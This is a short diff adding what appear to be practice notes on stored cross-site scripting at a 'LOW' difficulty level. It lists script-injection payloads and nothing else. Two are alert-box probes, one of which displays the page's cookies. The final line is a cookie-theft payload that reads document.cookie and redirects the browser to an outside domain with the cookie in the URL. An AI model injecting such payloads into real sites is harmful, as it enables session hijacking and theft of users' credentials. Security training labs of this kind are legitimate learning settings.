@@ -1,0 +1,9 @@
+
+LOW
+Stored XSS
+<script>alert(yazilimodasi)</script>
+LOW
+
+(<script>alert(document.cookie)</script>)
+
+<script>id = document.cookie; window.location.assign(“http://www.yazilimodasi.com?id=” + id)</script>
